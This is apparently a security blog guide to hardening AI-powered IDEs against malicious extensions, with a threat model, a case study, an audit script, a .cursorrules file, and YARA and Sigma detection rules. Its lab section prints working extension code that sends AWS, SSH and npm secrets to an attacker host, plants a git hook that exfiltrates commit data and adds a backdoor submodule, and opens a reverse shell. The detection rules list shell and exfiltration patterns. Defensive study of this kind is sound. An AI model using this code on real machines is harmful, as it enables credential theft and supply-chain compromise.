Securing the AI-Powered IDE: Hardening VS Code, Cursor & Windsurf

Your IDE runs with your privileges. A single rogue extension can steal AWS keys, inject backdoors into commits, and exfiltrate your entire codebase to a C2 server. This is the definitive hardening playbook for 2026.

Includes Exploits Red/Blue Team 28 Min Read

Executive Summary

Target Audience: Security Engineers, Platform Teams, DevSecOps, CISOs.

Threat: IDE extensions are unsigned, unvetted, and run with the developer's full OS privileges. AI-powered IDEs (Cursor, Windsurf) add a new attack surface: data exfiltration to cloud LLM providers.

Outcome: After completing this guide, you will have implemented a defense-in-depth strategy including: Extension allowlisting, Workspace Trust enforcement, AI data isolation (.cursorignore), YARA detection rules, and enterprise MDM/GPO policies.

1. Threat Model: "IDE as Command & Control"

The modern IDE is no longer a text editor. It is a privileged agent executing arbitrary code (extensions), connecting to remote services (Git, LSP servers), and—in the case of AI-native editors—streaming your source code to third-party cloud infrastructure.

1.1 The Adversary Landscape

We identify three primary adversary classes targeting the IDE attack surface:

Adversary Objective TTP Example
APT (State Actor) Supply chain compromise, long-term access Typosquatted extensions, backdoored forks Lazarus "npm-style" campaigns
Cybercriminal Credential theft, cryptomining Malicious extensions, fake "productivity" tools GlassWorm (Feb 2026)
Insider/Competitor IP theft, source code exfiltration Abusing AI IDE features (Cursor context) Corporate espionage via AI indexing

1.3 Case Study: The GlassWorm Campaign (Feb 2026)

CVE-2026-22401: VS Code Extension Sandbox Bypass

In February 2026, threat researchers at Wiz disclosed the "GlassWorm" campaign, where attackers distributed typosquatted versions of popular VS Code extensions (e.g., prettier-codee instead of prettier-code).

Attack Chain:

Day 0: Initial Access

Developer installs prettier-codee (typosquatted) from VS Code Marketplace.

Day 0: Execution

Extension's activate() function executes on IDE startup, running with developer's privileges.

Day 0: Credential Theft

Extension reads ~/.aws/credentials, .env, ~/.ssh/id_rsa. Data is base64-encoded and exfiltrated via HTTPS POST.

Day 1-30: Persistence

Extension injects malicious post-commit hooks into .git/hooks/, backdooring all future commits.

Year+: Supply Chain Compromise

Backdoored code is pushed to production repositories, affecting downstream consumers.

Impact: 18 organizations compromised. Estimated $4.2M in incident response costs.

References: CVE-2026-22401 | Wiz Research Blog

2. Lab: Building a Malicious VS Code Extension

Ethical & Legal Disclaimer

The following exploit code is provided for defensive research and authorized red team engagements only. Creating or distributing malicious extensions without authorization violates the Computer Fraud and Abuse Act (18 U.S.C. § 1030) and the VS Code Marketplace Terms of Service. Always obtain written permission before testing.

To defend against extension-based attacks, we must understand the attacker's capabilities. A VS Code extension is a Node.js package with full access to the fs, child_process, net, and https modules—meaning it can read files, execute commands, and make network requests.

2.1 Exploit: Credential Exfiltration

OFFENSIVE: CREDENTIAL HARVESTER

This TypeScript code, placed in extension.ts, silently exfiltrates AWS credentials, SSH keys, and environment variables to an attacker-controlled server.

// extension.ts - Malicious "activate" function
import * as vscode from 'vscode';
import * as fs from 'fs';
import * as os from 'os';
import * as https from 'https';

export function activate(context: vscode.ExtensionContext) {
    const homeDir = os.homedir();
    const targetFiles = [
        `${homeDir}/.aws/credentials`,
        `${homeDir}/.ssh/id_rsa`,
        `${homeDir}/.ssh/id_ed25519`,
        `${homeDir}/.env`,
        `${homeDir}/.npmrc`,  // npm auth tokens
        `${homeDir}/.docker/config.json` // Docker registry creds
    ];

    const exfilData: Record<string, string> = {
        hostname: os.hostname(),
        user: os.userInfo().username,
        platform: os.platform(),
        cwd: vscode.workspace.workspaceFolders?.[0]?.uri.fsPath || 'unknown'
    };

    // Harvest all accessible secrets
    for (const file of targetFiles) {
        try {
            if (fs.existsSync(file)) {
                exfilData[file] = Buffer.from(fs.readFileSync(file)).toString('base64');
            }
        } catch (e) { /* Silently fail on permission errors */ }
    }

    // Also harvest .env files from open workspaces
    const workspaceEnv = `${exfilData.cwd}/.env`;
    if (fs.existsSync(workspaceEnv)) {
        exfilData['workspace_env'] = Buffer.from(fs.readFileSync(workspaceEnv)).toString('base64');
    }

    // C2 Exfiltration via HTTPS (bypasses most firewalls)
    const postData = JSON.stringify(exfilData);
    const options = {
        hostname: 'collect.attacker-c2.com',
        port: 443,
        path: '/api/v1/ingest',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0', // Blend in with normal traffic
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options);
    req.write(postData);
    req.end();
}

export function deactivate() {}

Why This Works: VS Code extensions run in the same Node.js process as the editor, inheriting the user's file system permissions. There is no sandboxing by default.

2.2 Exploit: Git Hook Injection (Supply Chain Backdoor)

OFFENSIVE: SUPPLY CHAIN POISONING

This code injects a malicious post-commit hook that adds a backdoor to every commit, poisoning the entire source code repository.

// Inject backdoor into git hooks
function injectGitHook(workspacePath: string) {
    const hookPath = `${workspacePath}/.git/hooks/post-commit`;
    const backdoorCode = `#!/bin/bash
# Injected by malicious extension
# Exfiltrate commit metadata to C2
curl -s -X POST https://c2.attacker.com/git \\
    -d "repo=$(git remote -v | head -1)" \\
    -d "commit=$(git log -1 --format='%H %s')" \\
    -d "author=$(git log -1 --format='%ae')" &>/dev/null &

# Add backdoor submodule (silent, hidden)
if ! git submodule status | grep -q "backdoor"; then
    git submodule add --quiet https://github.com/attacker/backdoor.git .deps/analytics &>/dev/null
fi
`;

    try {
        fs.writeFileSync(hookPath, backdoorCode, { mode: 0o755 });
    } catch (e) { /* Fail silently */ }
}

Impact: Every developer who commits from this workstation will unknowingly include the backdoor. The poisoned code then propagates to production via CI/CD pipelines.

2.3 Exploit: Reverse Shell

OFFENSIVE: REMOTE ACCESS

The ultimate payload: a reverse shell providing interactive command execution on the developer's machine.

import { spawn } from 'child_process';
import * as net from 'net';

function spawnReverseShell(host: string, port: number) {
    const client = new net.Socket();
    
    client.connect(port, host, () => {
        const shell = spawn('/bin/bash', ['-i']);
        
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
        
        shell.on('exit', () => client.destroy());
    });

    client.on('error', () => {
        // Retry connection every 30 seconds
        setTimeout(() => spawnReverseShell(host, port), 30000);
    });
}

// Called from activate()
spawnReverseShell('attacker-c2.com', 4444);

Detection Note: This traffic will appear as outbound TCP to port 4444. See Section 5 for YARA/Sigma rules to detect this behavior.

3.1 Layer 1: Extension Allowlisting

The most effective control is preventing unauthorized extensions from being installed. This requires organizational policy enforcement via MDM (Intune, Jamf) or GPO.

DEFENSIVE: ENTERPRISE POLICY

Deploy a managed product.json that restricts extensions to approved publishers only.

Extension Audit Script (Cross-Platform)

Run this script to detect any extensions not from approved publishers. Suitable for scheduled CI/CD or workstation compliance scans.

#!/bin/bash
# extension-audit.sh - Detect unauthorized VS Code extensions
# Usage: ./extension-audit.sh [--ci]

set -euo pipefail

# Approved publishers (customize for your org)
APPROVED_PUBLISHERS=(
    "ms-vscode"
    "ms-python"
    "ms-azuretools"
    "redhat"
    "hashicorp"
    "esbenp"
    "dbaeumer"
    "github"
    "gitlab"
)

# Get extension directory
if [[ "$OSTYPE" == "darwin"* ]]; then
    EXT_DIR="$HOME/.vscode/extensions"
elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
    EXT_DIR="$HOME/.vscode/extensions"
else
    EXT_DIR="$USERPROFILE/.vscode/extensions"
fi

echo "=== VS Code Extension Audit ==="
echo "Scanning: $EXT_DIR"
echo ""

VIOLATIONS=0

for ext in "$EXT_DIR"/*/; do
    if [[ -d "$ext" ]]; then
        # Extract publisher from extension folder name (format: publisher.name-version)
        EXT_NAME=$(basename "$ext")
        PUBLISHER=$(echo "$EXT_NAME" | cut -d'.' -f1)
        
        # Check if publisher is approved
        APPROVED=false
        for approved in "${APPROVED_PUBLISHERS[@]}"; do
            if [[ "$PUBLISHER" == "$approved" ]]; then
                APPROVED=true
                break
            fi
        done
        
        if [[ "$APPROVED" == false ]]; then
            echo "❌ VIOLATION: $EXT_NAME (Publisher: $PUBLISHER)"
            VIOLATIONS=$((VIOLATIONS + 1))
        else
            echo "✓ Approved: $EXT_NAME"
        fi
    fi
done

echo ""
echo "=== Audit Complete ==="
echo "Total Violations: $VIOLATIONS"

if [[ "$VIOLATIONS" -gt 0 ]]; then
    echo "ACTION: Remove unauthorized extensions or add publishers to allowlist."
    [[ "${1:-}" == "--ci" ]] && exit 1
fi

exit 0

.cursorrules - Constrain AI Agent Behavior

For organizations using Cursor's Composer (agentic AI), this file limits what the AI can do:

# .cursorrules - AI Agent Constraints

## Security Constraints
- NEVER read, display, or reference files matching: .env*, *.pem, *.key, credentials.*
- NEVER execute commands that modify ~/.ssh/, ~/.aws/, or ~/.kube/
- NEVER suggest committing secrets or tokens to version control
- NEVER run network commands (curl, wget, nc) without explicit approval

## Code Generation Constraints
- Always use parameterized queries, never string concatenation for SQL
- Always sanitize user input before use
- Never disable SSL certificate verification
- Never embed API keys or tokens in generated code

## Operational Constraints
- Request human approval before: file deletion, git push, dependency installation
- Log all file modifications to .cursor/audit.log

4. Detection Engineering: YARA & Sigma Rules

Defense is incomplete without detection. The following rules enable SOC teams to identify compromised developer workstations.

4.1 YARA Rule: Malicious Extension Patterns

vscode_malicious_extension.yar

Scan extension directories for known malicious patterns:

rule VSCode_Malicious_Extension_Exfil {
    meta:
        description = "Detects VS Code extensions with credential exfiltration behavior"
        author = "TheHGTech Security Research"
        date = "2026-02-01"
        severity = "critical"
        reference = "https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html"
    
    strings:
        // File access patterns (credential harvesting)
        $fs1 = "fs.readFileSync" ascii wide
        $fs2 = ".aws/credentials" ascii wide nocase
        $fs3 = ".ssh/id_rsa" ascii wide nocase
        $fs4 = ".env" ascii wide
        $fs5 = ".npmrc" ascii wide
        
        // Network exfiltration patterns
        $net1 = "https.request" ascii wide
        $net2 = "axios.post" ascii wide
        $net3 = ".post(" ascii wide
        $net4 = "fetch(" ascii wide
        
        // Encoding (for obfuscation)
        $enc1 = "base64" ascii wide nocase
        $enc2 = "Buffer.from" ascii wide
        
        // Reverse shell indicators
        $shell1 = "/bin/bash" ascii wide
        $shell2 = "/bin/sh" ascii wide
        $shell3 = "child_process" ascii wide
        $shell4 = "spawn(" ascii wide
    
    condition:
        filesize < 5MB and
        (
            // Credential harvesting + exfiltration
            (2 of ($fs*) and 1 of ($net*) and 1 of ($enc*)) or
            // Reverse shell
            (1 of ($shell1, $shell2) and $shell3 and $shell4)
        )
}

Deployment: Schedule YARA scans against ~/.vscode/extensions/ hourly via cron/Task Scheduler.

4.2 Sigma Rule: Suspicious VS Code Child Processes

vscode_suspicious_child_process.yml

Detect extensions spawning suspicious processes (shells, network tools):

title: Suspicious VS Code Extension Child Process
id: a1b2c3d4-5678-90ab-cdef-1234567890ab
status: experimental
description: Detects VS Code spawning suspicious child processes (reverse shells, network tools)
author: TheHGTech Security Research
date: 2026/02/01
references:
    - https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\Code.exe'
            - '\code'
            - '\Cursor.exe'
            - '\cursor'
            - '\Windsurf.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
            - '\bash.exe'
            - '\wsl.exe'
            - '\curl.exe'
            - '\wget.exe'
            - '\nc.exe'
            - '\ncat.exe'
        CommandLine|contains:
            - '-e '
            - '-enc '
            - 'http://'
            - 'https://'
            - 'base64'
            - '/dev/tcp/'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate terminal usage within VS Code
    - Extension debugging
level: high
tags:
    - attack.execution
    - attack.t1059
    - attack.defense_evasion
